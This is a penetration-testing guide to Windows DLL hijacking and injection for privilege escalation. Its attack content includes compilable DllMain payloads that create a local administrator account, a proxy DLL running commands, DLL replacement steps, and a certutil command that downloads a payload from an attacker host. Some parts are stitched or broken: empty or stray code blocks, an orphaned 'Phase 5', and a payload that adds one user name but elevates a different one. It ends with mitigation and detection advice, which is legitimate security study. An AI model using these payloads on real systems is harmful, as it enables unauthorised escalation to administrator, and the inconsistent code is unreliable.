## Overview

Dynamic Link Libraries provide reusable code and resources to Windows applications.

DLL abuse generally falls into two broad categories:

```text
DLL injection
↓
Force a running process to load attacker-controlled code

DLL hijacking
↓
Influence which DLL an application loads during startup or execution
```

For Windows privilege escalation, DLL hijacking is usually the more relevant technique.

The typical escalation path is:

```text
Identify a privileged application or service
↓
Determine which DLLs it loads
↓
Find a missing or replaceable DLL
↓
Identify a writable directory in the DLL search path
↓
Place a malicious DLL in that location
↓
Trigger the application or wait for a privileged user to launch it
↓
Execute code in the application's security context
```

> [!important]
> A DLL hijack only provides the privileges of the process that loads the DLL. If a low-privileged user launches the application, the DLL executes with low privileges. Privilege escalation requires a privileged user, service, or scheduled process to trigger the load.

---

# DLL Injection vs DLL Hijacking

## DLL Injection

DLL injection inserts a DLL into an already running process.

Common goals include:

- executing code inside a trusted process
- inheriting the process token
- accessing process memory
- modifying process behavior
- evading basic process-based controls

Common injection methods include:

```text
LoadLibrary injection
manual mapping
reflective DLL injection
```

## DLL Hijacking

DLL hijacking abuses how an application locates and loads a DLL.

Common scenarios include:

- application loads a DLL without a full path
- required DLL is missing
- application directory is writable
- legitimate DLL is writable or replaceable
- writable directory appears early in the DLL search order
- application loads an attacker-controlled proxy DLL

---

# Why DLL Hijacking Leads to Privilege Escalation

A DLL hijack becomes a privilege escalation vector when all of the following are true:

```text
A privileged process loads a DLL
+
The DLL path or search location is writable
+
The attacker can control the DLL file
+
The process can be triggered
```

High-value process contexts include:

```text
NT AUTHORITY\SYSTEM
local administrator
privileged service account
scheduled task running with elevated rights
application launched by an administrator
```

---

# DLL Hijacking Categories

## 1. Missing DLL Hijacking

The application attempts to load a DLL that does not exist.

Example:

```text
Application searches for TextShaping.dll
↓
DLL is missing from application directory
↓
Application later finds a legitimate copy elsewhere
↓
Attacker places malicious TextShaping.dll in application directory
↓
Application loads attacker DLL first
```

This is often the easiest form of DLL hijacking.

---

## 2. DLL Replacement

A legitimate DLL already exists, but the current user can overwrite or replace it.

```text
Privileged process loads existing DLL
↓
DLL has weak permissions
↓
Attacker replaces it
↓
Process loads malicious replacement
```

The application may fail if the replacement DLL does not preserve expected exports.

---

## 3. DLL Search Order Hijacking

The application loads a DLL by name instead of by full path.

Example:

```cpp
LoadLibrary("library.dll");
```

Windows searches multiple locations for `library.dll`.

If an attacker can place a malicious DLL in a directory searched before the legitimate DLL, the malicious DLL may be loaded.

---

## 4. DLL Proxying

A malicious DLL uses the same name as the legitimate DLL, then forwards required exports to a renamed copy of the original.

```text
Original DLL renamed
↓
Proxy DLL given original DLL name
↓
Application loads proxy
↓
Proxy executes attacker code
↓
Proxy forwards calls to original DLL
```

This allows the application to continue working while attacker code executes.

---

# DLL Search Order

With Safe DLL Search Mode enabled, the standard search order is generally:

1. Application directory
2. System directory
3. 16-bit system directory
4. Windows directory
5. Current directory
6. Directories listed in `PATH`

The application directory is particularly important because it is searched first.

Example:

```text
C:\Program Files\Vendor\App\app.exe
```

If `app.exe` loads:

```text
helper.dll
```

Windows may first check:

```text
C:\Program Files\Vendor\App\helper.dll
```

If that directory is writable, the application may be vulnerable.

---

# Safe DLL Search Mode

Registry path:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
```

Registry value:

```text
SafeDllSearchMode
```

Query it:

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
```

Values:

| Value | Meaning |
|---|---|
| `1` | Safe DLL Search Mode enabled |
| `0` | Safe DLL Search Mode disabled |

When disabled, the current directory is searched earlier, increasing hijacking risk.

> [!note]
> Safe DLL Search Mode does not prevent hijacking from the application directory if that directory is writable.

# Interpreting Process Monitor Results

## Missing DLL

Example:

```text
CreateFile
C:\Program Files\Vendor\App\missing.dll
NAME NOT FOUND
```

Interpretation:

```text
The application searched this directory for missing.dll
The DLL is absent
If the directory is writable, it may be hijackable
```

---

## Legitimate DLL Loaded from Application Directory

Example:

```text
Load Image
C:\Program Files\Vendor\App\library.dll
SUCCESS
```

Interpretation:

```text
The application loads library.dll from its own directory
If the DLL is writable, replacement or proxying may be possible
```

---

## DLL Search Continues to System32

Example:

```text
C:\Program Files\Vendor\App\TextShaping.dll    NAME NOT FOUND
C:\Windows\System32\TextShaping.dll            SUCCESS
```

Interpretation:

```text
The application checks its own directory first
The DLL is missing there
The legitimate DLL is later loaded from System32
A malicious copy in the application directory may take precedence
```

This is a strong missing-DLL hijacking candidate.

# Phase 5 – Determine Whether Exports Are Required

A simple malicious DLL may work if the application only loads the DLL and does not call any exports.

If the application expects exported functions, the application may crash unless the malicious DLL provides them.

Use tools such as:

```text
dumpbin
PE Explorer
Dependencies
Ghidra
IDA
x64dbg
Process Explorer
```

Questions:

```text
Does the executable import functions from the DLL?
Does it call GetProcAddress?
Does it continue working when the DLL is missing?
Does the DLL require named or ordinal exports?
```

Decision:

```text
No required exports
→ DllMain-only payload may be enough

Required exports
→ Create matching exports or use DLL proxying
```

# DLL Entry Point – DllMain

A DLL may define an entry point called:

```text
DllMain
```

Basic structure:

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
```

The most relevant event for hijacking is:

```text
DLL_PROCESS_ATTACH
```

This runs when the process loads the DLL.

---

# Example Proof-of-Execution DLL

Use a low-impact proof before using a more invasive payload.

```cpp
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD reason,
    LPVOID reserved
)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        system("whoami > C:\\Windows\\Temp\\dll-proof.txt");
    }

    return TRUE;
}
```

This writes the loader's identity to:

```text
C:\Windows\Temp\dll-proof.txt
```

Check it:

```cmd
type C:\Windows\Temp\dll-proof.txt
```

---

# Example Privilege Escalation DLL

The following example creates a temporary local administrator.

```cpp
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD reason,
    LPVOID reserved
)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        system("net user swordfish Password123! /add");
        system("net localgroup administrators svcadmin /add");
    }

    return TRUE;
}
```

> [!warning]
> Use account-creation payloads only in controlled labs or where explicitly authorised. Remove the account during cleanup.

# DLL Replacement Workflow

Use when an existing DLL is writable.

## Back Up Original DLL

```cmd
copy "C:\Path\To\Application\library.dll" "C:\Users\Public\library.dll.bak"
```

or:

```cmd
move "C:\Path\To\Application\library.dll" "C:\Users\Public\library.dll.bak"
```

## Replace It

```cmd
move "C:\Users\Public\payload.dll" "C:\Path\To\Application\library.dll"
```

## Trigger Application

Start or wait for the privileged process.

## Restore Original

```cmd
del "C:\Path\To\Application\library.dll"
move "C:\Users\Public\library.dll.bak" "C:\Path\To\Application\library.dll"
```

> [!warning]
> Replacing an actively used DLL may break the application. Proxying is usually safer where required exports must remain available.

# DLL Proxying

## When Proxying Is Needed

Use DLL proxying when:

```text
the application requires exported functions
the original DLL must continue working
a simple DllMain payload causes the application to crash
stealth or reliability is important
```

General process:

```text
Rename original DLL
↓
Create proxy DLL using original name
↓
Export expected functions
↓
Load renamed original DLL
↓
Resolve and call original functions
↓
Execute attacker-controlled code
```

---

# Proxy DLL Example

Assume the application expects:

```text
Add(int, int)
```

Original DLL renamed to:

```text
library.original.dll
```

Proxy DLL source:

```cpp
#include <windows.h>

typedef int (*AddFunction)(int, int);

extern "C" __declspec(dllexport)
int Add(int a, int b)
{
    HMODULE original = LoadLibraryA("library.original.dll");

    if (original == NULL)
    {
        return -1;
    }

    AddFunction originalAdd =
        (AddFunction)GetProcAddress(original, "Add");

    if (originalAdd == NULL)
    {
        FreeLibrary(original);
        return -1;
    }

    int result = originalAdd(a, b);

    FreeLibrary(original);

    return result;
}

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD reason,
    LPVOID reserved
)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        system("whoami > C:\\Windows\\Temp\\proxy-proof.txt");
    }

    return TRUE;
}
```

Compile:

```bash
x86_64-w64-mingw32-g++ proxy.cpp --shared -o library.dll
```

Directory contents:

```text
application.exe
library.dll
library.original.dll
```

# DLL Injection Background

DLL injection is distinct from DLL hijacking.

It targets a running process rather than influencing the normal DLL search process.

---

# LoadLibrary Injection

Typical workflow:

```text
Open target process
↓
Allocate memory in the target
↓
Write DLL path into remote memory
↓
Resolve LoadLibraryA
↓
Create remote thread
↓
Target process loads DLL
```

Common APIs:

| API | Purpose |
|---|---|
| `OpenProcess` | Obtain process handle |
| `VirtualAllocEx` | Allocate memory in target |
| `WriteProcessMemory` | Write DLL path |
| `GetProcAddress` | Resolve `LoadLibraryA` |
| `CreateRemoteThread` | Start DLL load in target |

Typical telemetry:

```text
OpenProcess
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
LoadLibraryA
```

---

# Manual Mapping

Manual mapping loads a DLL without using the normal `LoadLibrary` process.

It manually handles:

- PE headers
- sections
- imports
- relocations
- TLS callbacks
- `DllMain`

Advantages:

```text
may avoid normal DLL loader behavior
may not appear in standard module lists
can reduce LoadLibrary-specific telemetry
```

Disadvantages:

```text
complex
error-prone
may crash target process
requires careful PE handling
```

---

# Reflective DLL Injection

Reflective DLL injection loads a DLL from memory using a loader contained inside the DLL.

Typical workflow:

```text
DLL written into process memory
↓
ReflectiveLoader locates itself
↓
Allocates memory
↓
Copies sections
↓
Resolves imports
↓
Applies relocations
↓
Runs TLS callbacks
↓
Calls DllMain
```

This is more relevant to in-memory execution and evasion than routine DLL hijacking privilege escalation.

## Is the Target Already Running?

```text
Yes
→ Consider DLL injection or runtime process analysis

No / starts periodically
→ Consider DLL hijacking
```

```text
Yes
```

```text
Yes

```

```text
configuration-controlled DLL paths
other directories in the search sequence
```

```text
No
→ DllMain payload may work
```

```text

```

# Troubleshooting

## DLL Does Not Load

Check:

```text
filename is exact
architecture matches target process
DLL is in the correct directory
application was fully restarted
target code path actually loads the DLL
application uses a full DLL path
application uses SetDllDirectory
application manifest changes loading behavior
security tooling blocked the DLL
DLL dependencies are missing
```

---

## Application Crashes

Likely causes:

```text
missing required exports
incorrect function signatures
wrong calling convention
wrong architecture
unsafe work inside DllMain
original DLL functionality missing
proxy cannot find renamed original DLL
```

Use proxying or provide required exports.

---

## Procmon Shows Many Missing DLLs

Not every `NAME NOT FOUND` result is exploitable.

Prioritise DLLs where:

```text
the application later continues normally
the application directory is searched
the directory is writable
the application is privileged
the DLL load occurs in a useful code path
```

---

## Missing DLL Does Not Trigger

Possible reasons:

```text
feature-specific DLL load
application was not fully restarted
capture was stale
DLL is now found earlier in the search order
target process uses a different working directory
the load attempt is optional and never reaches executable code
```

---

## DLL Works When You Launch the App but Not for Admin

Check:

```text
different application path
different working directory
different user profile
different environment PATH
32-bit vs 64-bit application
admin launches another installed copy
```

---

## PowerShell Download Fails

Try:

```cmd
certutil -urlcache -f http://<attacker_ip>/payload.dll C:\Users\Public\payload.dll
```

or use an existing file transfer method.

# Defensive Notes

## Common Root Causes

DLL hijacking vulnerabilities usually result from:

- unqualified DLL loading
- writable application directories
- missing DLL dependencies
- insecure installer permissions
- writable directories in `PATH`
- privileged software loading optional DLLs
- legacy applications
- poor plugin-loading design

---

# Mitigations

Application developers should:

```text
use fully qualified DLL paths
use secure LoadLibraryEx flags
avoid loading DLLs from writable directories
validate DLL signatures
remove unnecessary DLL dependencies
avoid using the current working directory for DLL loading
```

Administrators should:

```text
restrict write access to application directories
remove writable directories from system PATH
enable Safe DLL Search Mode
use WDAC or AppLocker
monitor privileged application directories
keep third-party software updated
audit applications launched by privileged users
```

---

# Detection Opportunities

Monitor for:

```text
DLL loads from user-writable directories
unsigned DLLs loaded by privileged processes
NAME NOT FOUND followed by successful DLL load
new DLLs written to application directories
CreateRemoteThread activity
VirtualAllocEx and WriteProcessMemory
unexpected child processes from DllMain payloads
net user or net localgroup commands from GUI applications
```

Suspicious hijacking sequence:

```text
Application probes for DLL
↓
NAME NOT FOUND
↓
Low-privileged user writes DLL
↓
Privileged application starts
↓
DLL loads from writable directory
↓
Unexpected command or process executes
```

---

# Key Takeaways

- DLL injection and DLL hijacking are related but distinct techniques.
- DLL hijacking is usually more relevant for Windows privilege escalation.
- Missing DLLs are strong candidates when the search directory is writable.
- The application directory is searched early and is therefore high value.
- Process Monitor is the primary tool for identifying DLL loading behavior.
- `NAME NOT FOUND` alone does not prove exploitability.
- Always confirm the loader's privilege context.
- The DLL architecture must match the target process.
- A simple `DllMain` payload may work when no exports are required.
- DLL proxying preserves application functionality when required exports exist.
- Starting the application yourself only gives your own privileges.
- Automated and public vulnerability information should be validated manually.
- Always restore replaced DLLs and remove planted files after testing.
